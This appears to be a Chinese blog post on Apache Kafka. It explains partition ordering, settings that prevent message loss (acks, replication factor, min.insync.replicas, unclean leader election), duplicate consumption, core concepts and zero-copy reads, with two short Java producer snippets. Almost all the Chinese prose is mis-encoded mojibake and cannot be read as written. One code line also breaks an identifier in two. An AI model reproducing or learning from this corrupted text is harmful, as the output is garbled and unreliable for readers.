<p>æ¯æ¬¡æ·»åŠ æ¶ˆæ¯åˆ°åˆ†åŒºï¼ˆPartitionï¼‰çš„æ—¶å€™éƒ½ä¼šé‡‡ç”¨å°¾åŠ æ³•ï¼Œå¦‚ä¸Šå›¾æ‰€ç¤ºã€‚ <strong>Kafka åªèƒ½ä¿è¯åˆ†åŒºï¼ˆPartitionï¼‰ä¸­çš„æ¶ˆæ¯æœ‰åºã€‚</strong></p>
<blockquote>
<p>æ¶ˆæ¯åœ¨è¢«è¿½åŠ åˆ°åˆ†åŒºï¼ˆPartitionï¼‰çš„æ—¶å€™éƒ½ä¼šåˆ†é…ä¸€ä¸ªç‰¹å®šçš„åç§»é‡ï¼ˆoffsetï¼‰ã€‚Kafka é€šè¿‡åç§»é‡ï¼ˆoffsetï¼‰æ¥ä¿è¯æ¶ˆæ¯åœ¨åˆ†åŒºå†…çš„é¡ºåºæ€§ã€‚</p>
</blockquote>
<ul>
<li><p><strong>1 ä¸ª Topic åªå¯¹åº”ä¸€ä¸ª Partition</strong>ã€‚è¿™æ ·å½“ç„¶å¯ä»¥è§£å†³é—®é¢˜ï¼Œä½†æ˜¯ç ´åäº† Kafka çš„è®¾è®¡åˆè¡·ã€‚</p>
</li>
<li><p>Kafka ä¸­å‘é€ 1 æ¡æ¶ˆæ¯çš„æ—¶å€™ï¼Œå¯ä»¥æŒ‡å®š topic, partition, key,dataï¼ˆæ•°æ®ï¼‰ 4 ä¸ªå‚æ•°ã€‚å¦‚æœä½ å‘é€æ¶ˆæ¯çš„æ—¶å€™æŒ‡å®šäº† Partition çš„è¯ï¼Œæ‰€æœ‰æ¶ˆæ¯éƒ½ä¼šè¢«å‘é€åˆ°æŒ‡å®šçš„ Partitionã€‚å¹¶ä¸”ï¼ŒåŒä¸€ä¸ª key çš„æ¶ˆæ¯å¯ä»¥ä¿è¯åªå‘é€åˆ°åŒä¸€ä¸ª partitionï¼Œè¿™ä¸ªæˆ‘ä»¬é‡‡ç”¨è¡¨&#x2F;å¯¹è±¡çš„ id æ¥ä½œä¸º key ã€‚</p>
</li>
</ul>
<p>æ€»ç»“ä¸€ä¸‹ï¼Œå¯¹äºå¦‚ä½•ä¿è¯ Kafka ä¸­æ¶ˆæ¯æ¶ˆè´¹çš„é¡ºåºï¼Œæœ‰äº†ä¸‹é¢ä¸¤ç§æ–¹æ³•ï¼š</p>
<ol>
<li>1 ä¸ª Topic åªå¯¹åº”ä¸€ä¸ª Partitionã€‚</li>
<li>ï¼ˆæ¨èï¼‰å‘é€æ¶ˆæ¯çš„æ—¶å€™æŒ‡å®š key&#x2F;Partitionã€‚</li>
</ol>
<h2 id="Kafka-å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸ä¸¢å¤±"><a href="#Kafka-å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸ä¸¢å¤±" class="headerlink" title="Kafka å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸ä¸¢å¤±"></a>Kafka å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸ä¸¢å¤±</h2><h3 id="ç”Ÿäº§è€…ä¸¢å¤±æ¶ˆæ¯çš„æƒ…å†µ"><a href="#ç”Ÿäº§è€…ä¸¢å¤±æ¶ˆæ¯çš„æƒ…å†µ" class="headerlink" title="ç”Ÿäº§è€…ä¸¢å¤±æ¶ˆæ¯çš„æƒ…å†µ"></a>ç”Ÿäº§è€…ä¸¢å¤±æ¶ˆæ¯çš„æƒ…å†µ</h3><p>ç”Ÿäº§è€…ï¼ˆProducerï¼‰è°ƒç”¨<code>send</code>æ–¹æ³•å‘é€æ¶ˆæ¯ä¹‹åï¼Œæ¶ˆæ¯å¯èƒ½å› ä¸ºç½‘ç»œé—®é¢˜å¹¶æ²¡æœ‰å‘é€è¿‡å»ã€‚</p>
<p>æ‰€ä»¥ï¼Œä¸èƒ½é»˜è®¤åœ¨è°ƒç”¨<code>send</code>æ–¹æ³•å‘é€æ¶ˆæ¯ä¹‹åæ¶ˆæ¯å‘é€æˆåŠŸäº†ã€‚ä¸ºäº†ç¡®å®šæ¶ˆæ¯æ˜¯å‘é€æˆåŠŸï¼Œè¦åˆ¤æ–­æ¶ˆæ¯å‘é€çš„ç»“æœã€‚ä½†æ˜¯è¦æ³¨æ„çš„æ˜¯  Kafka ç”Ÿäº§è€…ï¼ˆProducerï¼‰ä½¿ç”¨  <code>send</code> æ–¹æ³•å‘é€æ¶ˆæ¯å®é™…ä¸Šæ˜¯å¼‚æ­¥çš„æ“ä½œï¼Œå¯ä»¥é€šè¿‡ <code>get()</code>æ–¹æ³•è·å–è°ƒç”¨ç»“æœï¼Œä½†æ˜¯è¿™æ ·ä¹Ÿè®©å®ƒå˜ä¸ºäº†åŒæ­¥æ“ä½œï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<blockquote>
<p><strong>è¯¦ç»†ä»£ç è§æˆ‘çš„è¿™ç¯‡æ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s?__biz=Mzg2OTA0Njk0OA==&mid=2247486269&idx=2&sn=ec00417ad641dd8c3d145d74cafa09ce&chksm=cea244f6f9d5cde0c8eb233fcc4cf82e11acd06446719a7af55230649863a3ddd95f78d111de&token=1633957262&lang=zh_CN#rd">Kafkaç³»åˆ—ç¬¬ä¸‰ç¯‡ï¼10 åˆ†é’Ÿå­¦ä¼šå¦‚ä½•åœ¨ Spring Boot ç¨‹åºä¸­ä½¿ç”¨ Kafka ä½œä¸ºæ¶ˆæ¯é˜Ÿåˆ—?  (opens new window)</a></strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SendResult&lt;String, Object&gt; sendResult = kafkaTemplate.send(topic, o).get();</span><br><span class="line"><span class="keyword">if</span> (sendResult.getRecordMetadata() != <span class="literal">null</span>) &#123;</span><br><span class="line">  logger.info(<span class="string">&quot;ç”Ÿäº§è€…æˆåŠŸå‘é€æ¶ˆæ¯åˆ°&quot;</span> + sendResult.getProducerRecord().topic() + <span class="string">&quot;-&gt; &quot;</span> + sendRe</span><br><span class="line">              sult.getProducerRecord().value().toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸€èˆ¬ä¸æ¨èè¿™ä¹ˆåšï¼å¯ä»¥é‡‡ç”¨ä¸ºå…¶æ·»åŠ å›è°ƒå‡½æ•°çš„å½¢å¼ï¼Œç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ListenableFuture&lt;SendResult&lt;String, Object&gt;&gt; future = kafkaTemplate.send(topic, o);</span><br><span class="line">future.addCallback(result -&gt; logger.info(<span class="string">&quot;ç”Ÿäº§è€…æˆåŠŸå‘é€æ¶ˆæ¯åˆ°topic:&#123;&#125; partition:&#123;&#125;çš„æ¶ˆæ¯&quot;</span>, result.getRecordMetadata().topic(), result.getRecordMetadata().partition()),</span><br><span class="line">        ex -&gt; logger.error(<span class="string">&quot;ç”Ÿäº§è€…å‘é€æ¶ˆå¤±è´¥ï¼ŒåŸå› ï¼š&#123;&#125;&quot;</span>, ex.getMessage()));</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ¶ˆæ¯å‘é€å¤±è´¥çš„è¯ï¼Œæ£€æŸ¥å¤±è´¥çš„åŸå› ä¹‹åé‡æ–°å‘é€å³å¯ï¼</p>
<p><strong>å¦å¤–è¿™é‡Œæ¨èä¸º Producer çš„<code>retries</code>ï¼ˆé‡è¯•æ¬¡æ•°ï¼‰è®¾ç½®ä¸€ä¸ªæ¯”è¾ƒåˆç†çš„å€¼ï¼Œä¸€èˆ¬æ˜¯ 3 ï¼Œä½†æ˜¯ä¸ºäº†ä¿è¯æ¶ˆæ¯ä¸ä¸¢å¤±çš„è¯ä¸€èˆ¬ä¼šè®¾ç½®æ¯”è¾ƒå¤§ä¸€ç‚¹ã€‚è®¾ç½®å®Œæˆä¹‹åï¼Œå½“å‡ºç°ç½‘ç»œé—®é¢˜ä¹‹åèƒ½å¤Ÿè‡ªåŠ¨é‡è¯•æ¶ˆæ¯å‘é€ï¼Œé¿å…æ¶ˆæ¯ä¸¢å¤±ã€‚å¦å¤–ï¼Œå»ºè®®è¿˜è¦è®¾ç½®é‡è¯•é—´éš”ï¼Œå› ä¸ºé—´éš”å¤ªå°çš„è¯é‡è¯•çš„æ•ˆæœå°±ä¸æ˜æ˜¾äº†ï¼Œç½‘ç»œæ³¢åŠ¨ä¸€æ¬¡ä½ 3æ¬¡ä¸€ä¸‹å­å°±é‡è¯•å®Œäº†</strong></p>
<h3 id="æ¶ˆè´¹è€…ä¸¢å¤±æ¶ˆæ¯çš„æƒ…å†µ"><a href="#æ¶ˆè´¹è€…ä¸¢å¤±æ¶ˆæ¯çš„æƒ…å†µ" class="headerlink" title="æ¶ˆè´¹è€…ä¸¢å¤±æ¶ˆæ¯çš„æƒ…å†µ"></a>æ¶ˆè´¹è€…ä¸¢å¤±æ¶ˆæ¯çš„æƒ…å†µ</h3><p>æ¶ˆæ¯åœ¨è¢«è¿½åŠ åˆ°åˆ†åŒºï¼ˆPartitionï¼‰çš„æ—¶å€™éƒ½ä¼šåˆ†é…ä¸€ä¸ªç‰¹å®šçš„åç§»é‡ï¼ˆoffsetï¼‰ã€‚åç§»é‡ï¼ˆoffsetï¼‰è¡¨ç¤º Consumer å½“å‰æ¶ˆè´¹åˆ°çš„åˆ†åŒºï¼ˆPartitionï¼‰çš„æ‰€åœ¨çš„ä½ç½®ã€‚Kafka é€šè¿‡åç§»é‡ï¼ˆoffsetï¼‰å¯ä»¥ä¿è¯æ¶ˆæ¯åœ¨åˆ†åŒºå†…çš„é¡ºåºæ€§ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202203012058652.jpg" alt="kafka offset"></p>
<p>å½“æ¶ˆè´¹è€…æ‹‰å–åˆ°äº†åˆ†åŒºçš„æŸä¸ªæ¶ˆæ¯ä¹‹åï¼Œæ¶ˆè´¹è€…ä¼šè‡ªåŠ¨æäº¤äº† offsetã€‚è‡ªåŠ¨æäº¤çš„è¯ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œè¯•æƒ³ä¸€ä¸‹ï¼Œå½“æ¶ˆè´¹è€…åˆšæ‹¿åˆ°è¿™ä¸ªæ¶ˆæ¯å‡†å¤‡è¿›è¡ŒçœŸæ­£æ¶ˆè´¹çš„æ—¶å€™ï¼Œçªç„¶æŒ‚æ‰äº†ï¼Œæ¶ˆæ¯å®é™…ä¸Šå¹¶æ²¡æœ‰è¢«æ¶ˆè´¹ï¼Œä½†æ˜¯ offset å´è¢«è‡ªåŠ¨æäº¤äº†ã€‚</p>
<p><strong>å¯ä»¥æ‰‹åŠ¨å…³é—­è‡ªåŠ¨æäº¤ offsetï¼Œæ¯æ¬¡åœ¨çœŸæ­£æ¶ˆè´¹å®Œæ¶ˆæ¯ä¹‹åå†æ‰‹åŠ¨æäº¤ offset ã€‚</strong> ä½†æ˜¯ï¼Œè¿™æ ·ä¼šå¸¦æ¥æ¶ˆæ¯è¢«é‡æ–°æ¶ˆè´¹çš„é—®é¢˜ã€‚æ¯”å¦‚ä½ åˆšåˆšæ¶ˆè´¹å®Œæ¶ˆæ¯ä¹‹åï¼Œè¿˜æ²¡æäº¤ offsetï¼Œç»“æœè‡ªå·±æŒ‚æ‰äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªæ¶ˆæ¯ç†è®ºä¸Šå°±ä¼šè¢«æ¶ˆè´¹ä¸¤æ¬¡ã€‚</p>
<h3 id="Kafka-å¼„ä¸¢äº†æ¶ˆæ¯"><a href="#Kafka-å¼„ä¸¢äº†æ¶ˆæ¯" class="headerlink" title="Kafka å¼„ä¸¢äº†æ¶ˆæ¯"></a>Kafka å¼„ä¸¢äº†æ¶ˆæ¯</h3><p><strong>è¯•æƒ³ä¸€ç§æƒ…å†µï¼šå‡å¦‚ leader å‰¯æœ¬æ‰€åœ¨çš„ broker çªç„¶æŒ‚æ‰ï¼Œé‚£ä¹ˆå°±è¦ä» follower å‰¯æœ¬é‡æ–°é€‰å‡ºä¸€ä¸ª leader ï¼Œä½†æ˜¯ leader çš„æ•°æ®è¿˜æœ‰ä¸€äº›æ²¡æœ‰è¢« follower å‰¯æœ¬çš„åŒæ­¥çš„è¯ï¼Œå°±ä¼šé€ æˆæ¶ˆæ¯ä¸¢å¤±ã€‚</strong></p>
<p>è§£å†³åŠæ³•å°±æ˜¯è®¾ç½®  <strong>acks &#x3D; all</strong>ã€‚</p>
<p>acks çš„é»˜è®¤å€¼å³ä¸º1ï¼Œä»£è¡¨æ¶ˆæ¯è¢«leaderå‰¯æœ¬æ¥æ”¶ä¹‹åå°±ç®—è¢«æˆåŠŸå‘é€ã€‚å½“é…ç½® <strong>acks &#x3D; all</strong> ä»£è¡¨åˆ™æ‰€æœ‰å‰¯æœ¬éƒ½è¦æ¥æ”¶åˆ°è¯¥æ¶ˆæ¯ä¹‹åè¯¥æ¶ˆæ¯æ‰ç®—çœŸæ­£æˆåŠŸè¢«å‘é€ã€‚</p>
<p><strong>è®¾ç½® replication.factor &gt;&#x3D; 3</strong></p>
<p>ä¸ºäº†ä¿è¯ leader å‰¯æœ¬èƒ½æœ‰ follower å‰¯æœ¬èƒ½åŒæ­¥æ¶ˆæ¯ï¼Œä¸€èˆ¬ä¼šä¸º topic è®¾ç½® <strong>replication.factor &gt;&#x3D; 3</strong>ã€‚è¿™æ ·å°±å¯ä»¥ä¿è¯æ¯ä¸ªåˆ†åŒºï¼ˆpartitionï¼‰è‡³å°‘æœ‰ 3 ä¸ªå‰¯æœ¬ã€‚è™½ç„¶é€ æˆäº†æ•°æ®å†—ä½™ï¼Œä½†æ˜¯å¸¦æ¥äº†æ•°æ®çš„å®‰å…¨æ€§ã€‚</p>
<p><strong>è®¾ç½® min.insync.replicas &gt; 1</strong></p>
<p>ä¸€èˆ¬æƒ…å†µä¸‹è¿˜éœ€è¦è®¾ç½® <strong>min.insync.replicas&gt; 1</strong> ï¼Œè¿™æ ·é…ç½®ä»£è¡¨æ¶ˆæ¯è‡³å°‘è¦è¢«å†™å…¥åˆ° 2 ä¸ªå‰¯æœ¬æ‰ç®—æ˜¯è¢«æˆåŠŸå‘é€ã€‚<strong>min.insync.replicas</strong> çš„é»˜è®¤å€¼ä¸º 1 ï¼Œåœ¨å®é™…ç”Ÿäº§ä¸­åº”å°½é‡é¿å…é»˜è®¤å€¼ 1ã€‚</p>
<p>ä½†æ˜¯ï¼Œä¸ºäº†ä¿è¯æ•´ä¸ª Kafka æœåŠ¡çš„é«˜å¯ç”¨æ€§ï¼Œä½ éœ€è¦ç¡®ä¿ <strong>replication.factor &gt; min.insync.replicas</strong> ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè®¾æƒ³ä¸€ä¸‹å‡å¦‚ä¸¤è€…ç›¸ç­‰çš„è¯ï¼Œåªè¦æ˜¯æœ‰ä¸€ä¸ªå‰¯æœ¬æŒ‚æ‰ï¼Œæ•´ä¸ªåˆ†åŒºå°±æ— æ³•æ­£å¸¸å·¥ä½œäº†ã€‚è¿™æ˜æ˜¾è¿åé«˜å¯ç”¨æ€§ï¼ä¸€èˆ¬æ¨èè®¾ç½®æˆ <strong>replication.factor &#x3D; min.insync.replicas + 1</strong>ã€‚</p>
<p><strong>è®¾ç½® unclean.leader.election.enable &#x3D; false</strong></p>
<blockquote>
<p><strong>Kafka 0.11.0.0ç‰ˆæœ¬å¼€å§‹ unclean.leader.election.enable å‚æ•°çš„é»˜è®¤å€¼ç”±åŸæ¥çš„true æ”¹ä¸ºfalse</strong></p>
</blockquote>
<p>é…ç½®äº† <strong>unclean.leader.election.enable &#x3D; false</strong>  çš„è¯ï¼Œå½“ leader å‰¯æœ¬å‘ç”Ÿæ•…éšœæ—¶å°±ä¸ä¼šä»  follower å‰¯æœ¬ä¸­å’Œ leader åŒæ­¥ç¨‹åº¦è¾¾ä¸åˆ°è¦æ±‚çš„å‰¯æœ¬ä¸­é€‰æ‹©å‡º  leader ï¼Œè¿™æ ·é™ä½äº†æ¶ˆæ¯ä¸¢å¤±çš„å¯èƒ½æ€§ã€‚</p>
<h2 id="Kafka-å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸é‡å¤æ¶ˆè´¹"><a href="#Kafka-å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸é‡å¤æ¶ˆè´¹" class="headerlink" title="Kafka å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸é‡å¤æ¶ˆè´¹"></a>Kafka å¦‚ä½•ä¿è¯æ¶ˆæ¯ä¸é‡å¤æ¶ˆè´¹</h2><p><strong>kafkaå‡ºç°æ¶ˆæ¯é‡å¤æ¶ˆè´¹çš„åŸå› ï¼š</strong></p>
<ul>
<li>æœåŠ¡ç«¯ä¾§å·²ç»æ¶ˆè´¹çš„æ•°æ®æ²¡æœ‰æˆåŠŸæäº¤ offsetï¼ˆæ ¹æœ¬åŸå› ï¼‰ã€‚</li>
<li>Kafka ä¾§ç”±äºæœåŠ¡ç«¯å¤„ç†ä¸šåŠ¡æ—¶é—´é•¿æˆ–è€…ç½‘ç»œé“¾æ¥ç­‰ç­‰åŸå› è®© Kafka è®¤ä¸ºæœåŠ¡å‡æ­»ï¼Œè§¦å‘äº†åˆ†åŒº rebalanceã€‚</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li><p>æ¶ˆè´¹æ¶ˆæ¯æœåŠ¡åšå¹‚ç­‰æ ¡éªŒï¼Œæ¯”å¦‚ Redis çš„setã€MySQL çš„ä¸»é”®ç­‰å¤©ç„¶çš„å¹‚ç­‰åŠŸèƒ½ã€‚è¿™ç§æ–¹æ³•æœ€æœ‰æ•ˆã€‚</p>
</li>
<li><p>å°† <code>enable.auto.commit</code>å‚æ•°è®¾ç½®ä¸º falseï¼Œå…³é—­è‡ªåŠ¨æäº¤ï¼Œå¼€å‘è€…åœ¨ä»£ç ä¸­æ‰‹åŠ¨æäº¤ offsetã€‚é‚£ä¹ˆè¿™é‡Œä¼šæœ‰ä¸ªé—®é¢˜ï¼š</p>
<p>ä»€ä¹ˆæ—¶å€™æäº¤offsetåˆé€‚ï¼Ÿ</p>
<ul>
<li>å¤„ç†å®Œæ¶ˆæ¯å†æäº¤ï¼šä¾æ—§æœ‰æ¶ˆæ¯é‡å¤æ¶ˆè´¹çš„é£é™©ï¼Œå’Œè‡ªåŠ¨æäº¤ä¸€æ ·ã€‚</li>
<li>æ‹‰å–åˆ°æ¶ˆæ¯å³æäº¤ï¼šä¼šæœ‰æ¶ˆæ¯ä¸¢å¤±çš„é£é™©ã€‚å…è®¸æ¶ˆæ¯å»¶æ—¶çš„åœºæ™¯ï¼Œä¸€èˆ¬ä¼šé‡‡ç”¨è¿™ç§æ–¹å¼ã€‚ç„¶åï¼Œé€šè¿‡å®šæ—¶ä»»åŠ¡åœ¨ä¸šåŠ¡ä¸ç¹å¿™ï¼ˆæ¯”å¦‚å‡Œæ™¨ï¼‰çš„æ—¶å€™åšæ•°æ®å…œåº•ã€‚</li>
</ul>
</li>
</ul>
<h2 id="ä¸ºä»€ä¹ˆä¼šæœ‰æ¶ˆæ¯ç³»ç»Ÿ"><a href="#ä¸ºä»€ä¹ˆä¼šæœ‰æ¶ˆæ¯ç³»ç»Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šæœ‰æ¶ˆæ¯ç³»ç»Ÿ"></a>ä¸ºä»€ä¹ˆä¼šæœ‰æ¶ˆæ¯ç³»ç»Ÿ</h2><ul>
<li><p>è§£è€¦åˆ</p>
</li>
<li><p>å¼‚æ­¥å¤„ç† ä¾‹å¦‚ç”µå•†å¹³å°ï¼Œç§’æ€æ´»åŠ¨ã€‚ä¸€èˆ¬æµç¨‹ä¼šåˆ†ä¸ºï¼š1: <code>é£é™©æ§åˆ¶</code>ã€2ï¼š<code>åº“å­˜é”å®š</code>ã€3ï¼š<code>ç”Ÿæˆè®¢å•</code>ã€4ï¼š<code>çŸ­ä¿¡é€šçŸ¥</code>ã€5ï¼š<code>æ›´æ–°æ•°æ®</code></p>
</li>
<li><p>é€šè¿‡æ¶ˆæ¯ç³»ç»Ÿå°†ç§’æ€æ´»åŠ¨ä¸šåŠ¡æ‹†åˆ†å¼€ï¼Œå°†ä¸æ€¥éœ€å¤„ç†çš„ä¸šåŠ¡æ”¾åœ¨åé¢æ…¢æ…¢å¤„ç†ï¼›æµç¨‹æ”¹ä¸ºï¼š1ï¼š<code>é£é™©æ§åˆ¶</code>ã€2ï¼š<code>åº“å­˜é”å®š</code>ã€3:<code>æ¶ˆæ¯ç³»ç»Ÿ</code>ã€4:<code>ç”Ÿæˆè®¢å•</code>ã€5ï¼š<code>çŸ­ä¿¡é€šçŸ¥</code>ã€6ï¼š<code>æ›´æ–°æ•°æ®</code></p>
</li>
<li><p>æµé‡çš„æ§åˆ¶ ï¼š1. ç½‘å…³åœ¨æ¥å—åˆ°è¯·æ±‚åï¼Œå°±æŠŠè¯·æ±‚æ”¾å…¥åˆ°æ¶ˆæ¯é˜Ÿåˆ—é‡Œé¢ 2. åç«¯çš„æœåŠ¡ä»æ¶ˆæ¯é˜Ÿåˆ—é‡Œé¢è·å–åˆ°è¯·æ±‚ï¼Œå®Œæˆåç»­çš„ç§’æ€å¤„ç†æµç¨‹ã€‚ç„¶åå†ç»™ç”¨æˆ·è¿”å›ç»“æœã€‚ä¼˜ç‚¹ï¼šæ§åˆ¶äº†æµé‡ ç¼ºç‚¹ï¼šä¼šè®©æµç¨‹å˜æ…¢</p>
</li>
</ul>
<h2 id="Kafkaæ ¸å¿ƒæ¦‚å¿µ"><a href="#Kafkaæ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="Kafkaæ ¸å¿ƒæ¦‚å¿µ"></a>Kafkaæ ¸å¿ƒæ¦‚å¿µ</h2><p><strong>ç”Ÿäº§è€…</strong>ï¼šProducer å¾€Kafkaé›†ç¾¤ç”Ÿæˆæ•°æ®</p>
<p><strong>æ¶ˆè´¹è€…</strong>ï¼šConsumer å¾€Kafkaé‡Œé¢å»è·å–æ•°æ®ï¼Œå¤„ç†æ•°æ®ã€æ¶ˆè´¹æ•°æ®Kafkaçš„æ•°æ®æ˜¯ç”±æ¶ˆè´¹è€…è‡ªå·±å»æ‹‰å»Kafkaé‡Œé¢çš„æ•°æ®</p>
<p><strong>ä¸»é¢˜</strong>ï¼štopic</p>
<p><strong>åˆ†åŒº</strong>ï¼špartition é»˜è®¤ä¸€ä¸ªtopicæœ‰ä¸€ä¸ªåˆ†åŒºï¼ˆpartitionï¼‰ï¼Œè‡ªå·±å¯è®¾ç½®å¤šä¸ªåˆ†åŒºï¼ˆåˆ†åŒºåˆ†æ•£å­˜å‚¨åœ¨æœåŠ¡å™¨ä¸åŒèŠ‚ç‚¹ä¸Šï¼‰</p>
<h2 id="Kafkaçš„é›†ç¾¤æ¶æ„"><a href="#Kafkaçš„é›†ç¾¤æ¶æ„" class="headerlink" title="Kafkaçš„é›†ç¾¤æ¶æ„"></a>Kafkaçš„é›†ç¾¤æ¶æ„</h2><p>Kafkaé›†ç¾¤ä¸­ï¼Œä¸€ä¸ªkafkaæœåŠ¡å™¨å°±æ˜¯ä¸€ä¸ªbrokerï¼ŒTopicåªæ˜¯é€»è¾‘ä¸Šçš„æ¦‚å¿µï¼Œpartitionåœ¨ç£ç›˜ä¸Šå°±ä½“ç°ä¸ºä¸€ä¸ªç›®å½•ã€‚</p>
<p><strong>Consumer Group</strong>ï¼šæ¶ˆè´¹ç»„ æ¶ˆè´¹æ•°æ®çš„æ—¶å€™ï¼Œéƒ½å¿…é¡»æŒ‡å®šä¸€ä¸ªgroup idï¼ŒæŒ‡å®šä¸€ä¸ªç»„çš„idå‡å®šç¨‹åºAå’Œç¨‹åºBæŒ‡å®šçš„group idå·ä¸€æ ·ï¼Œé‚£ä¹ˆä¸¤ä¸ªç¨‹åºå°±å±äºåŒä¸€ä¸ªæ¶ˆè´¹ç»„ã€‚</p>
<p><strong>ç‰¹æ®Š</strong>: æ¯”å¦‚ï¼Œæœ‰ä¸€ä¸ªä¸»é¢˜topicAç¨‹åºAå»æ¶ˆè´¹äº†è¿™ä¸ªtopicAï¼Œé‚£ä¹ˆç¨‹åºBå°±ä¸èƒ½å†å»æ¶ˆè´¹topicAï¼ˆç¨‹åºAå’Œç¨‹åºBå±äºä¸€ä¸ªæ¶ˆè´¹ç»„ï¼‰ï¼›å†æ¯”å¦‚ç¨‹åºAå·²ç»æ¶ˆè´¹äº†topicAé‡Œé¢çš„æ•°æ®ï¼Œç°åœ¨è¿˜æ˜¯é‡æ–°å†æ¬¡æ¶ˆè´¹topicAçš„æ•°æ®ï¼Œæ˜¯ä¸å¯ä»¥çš„ï¼Œä½†æ˜¯é‡æ–°æŒ‡å®šä¸€ä¸ªgroup idå·ä»¥åï¼Œå¯ä»¥æ¶ˆè´¹ã€‚ä¸åŒæ¶ˆè´¹ç»„ä¹‹é—´æ²¡æœ‰å½±å“ï¼Œæ¶ˆè´¹ç»„éœ€è‡ªå®šä¹‰ï¼Œæ¶ˆè´¹è€…åç§°ç¨‹åºè‡ªåŠ¨ç”Ÿæˆï¼ˆç‹¬ä¸€æ— äºŒï¼‰ã€‚</p>
<p><strong>Controller</strong>ï¼šKafkaèŠ‚ç‚¹é‡Œé¢çš„ä¸€ä¸ªä¸»èŠ‚ç‚¹ï¼Œå€ŸåŠ©zookeeperã€‚</p>
<h2 id="Kafkaç£ç›˜é¡ºåºå†™ä¿è¯å†™æ•°æ®æ€§èƒ½"><a href="#Kafkaç£ç›˜é¡ºåºå†™ä¿è¯å†™æ•°æ®æ€§èƒ½" class="headerlink" title="Kafkaç£ç›˜é¡ºåºå†™ä¿è¯å†™æ•°æ®æ€§èƒ½"></a>Kafkaç£ç›˜é¡ºåºå†™ä¿è¯å†™æ•°æ®æ€§èƒ½</h2><p>kafkaå†™æ•°æ®ï¼šé¡ºåºå†™ï¼Œå¾€ç£ç›˜ä¸Šå†™æ•°æ®æ—¶ï¼Œå°±æ˜¯è¿½åŠ æ•°æ®ï¼Œæ²¡æœ‰éšæœºå†™çš„æ“ä½œã€‚ç»éªŒï¼šå¦‚æœä¸€ä¸ªæœåŠ¡å™¨ç£ç›˜è¾¾åˆ°ä¸€å®šçš„ä¸ªæ•°ï¼Œç£ç›˜ä¹Ÿè¾¾åˆ°ä¸€å®šè½¬æ•°ï¼Œå¾€ç£ç›˜é‡Œé¢é¡ºåºå†™ï¼ˆè¿½åŠ å†™ï¼‰æ•°æ®çš„é€Ÿåº¦å’Œå†™å†…å­˜çš„é€Ÿåº¦å·®ä¸å¤šï¼Œç”Ÿäº§è€…ç”Ÿäº§æ¶ˆæ¯ï¼Œç»è¿‡kafkaæœåŠ¡å…ˆå†™åˆ°os cache å†…å­˜ä¸­ï¼Œç„¶åç»è¿‡syncé¡ºåºå†™åˆ°ç£ç›˜ä¸Šã€‚</p>
<h2 id="Kafkaé›¶æ‹·è´æœºåˆ¶ä¿è¯è¯»æ•°æ®é«˜æ€§èƒ½"><a href="#Kafkaé›¶æ‹·è´æœºåˆ¶ä¿è¯è¯»æ•°æ®é«˜æ€§èƒ½" class="headerlink" title="Kafkaé›¶æ‹·è´æœºåˆ¶ä¿è¯è¯»æ•°æ®é«˜æ€§èƒ½"></a>Kafkaé›¶æ‹·è´æœºåˆ¶ä¿è¯è¯»æ•°æ®é«˜æ€§èƒ½</h2><p>æ¶ˆè´¹è€…è¯»å–æ•°æ®ä¸€èˆ¬æµç¨‹ï¼š</p>
<ol>
<li><p>æ¶ˆè´¹è€…å‘é€è¯·æ±‚ç»™kafkaæœåŠ¡</p>
</li>
<li><p>kafkaæœåŠ¡å»os cacheç¼“å­˜è¯»å–æ•°æ®ï¼ˆç¼“å­˜æ²¡æœ‰å°±å»ç£ç›˜è¯»å–æ•°æ®ï¼‰</p>
</li>
<li><p>ä»ç£ç›˜è¯»å–äº†æ•°æ®åˆ°os cacheç¼“å­˜ä¸­</p>
</li>
<li><p>os cacheå¤åˆ¶æ•°æ®åˆ°kafkaåº”ç”¨ç¨‹åºä¸­</p>
</li>
<li><p>kafkaå°†æ•°æ®ï¼ˆå¤åˆ¶ï¼‰å‘é€åˆ°socket cacheä¸­</p>
</li>
<li><p>socket cacheé€šè¿‡ç½‘å¡ä¼ è¾“ç»™æ¶ˆè´¹è€…</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/906580bd62dc4b418491e47713fdefca~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
</li>
</ol>
<p>kafka linux sendfileæŠ€æœ¯ â€” é›¶æ‹·è´</p>
<p>1.æ¶ˆè´¹è€…å‘é€è¯·æ±‚ç»™kafkaæœåŠ¡ </p>
<p>2.kafkaæœåŠ¡å»os cacheç¼“å­˜è¯»å–æ•°æ®ï¼ˆç¼“å­˜æ²¡æœ‰å°±å»ç£ç›˜è¯»å–æ•°æ®ï¼‰ </p>
<p>3.ä»ç£ç›˜è¯»å–äº†æ•°æ®åˆ°os cacheç¼“å­˜ä¸­ </p>
<p>4.os cacheç›´æ¥å°†æ•°æ®å‘é€ç»™ç½‘å¡ </p>
<p>5.é€šè¿‡ç½‘å¡å°†æ•°æ®ä¼ è¾“ç»™æ¶ˆè´¹è€…</p>
<p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/2a25f9d4e0fa443986a7c5266f818b98~tplv-k3u1fbpfcp-watermark.awebp" alt="å›¾ç‰‡"></p>
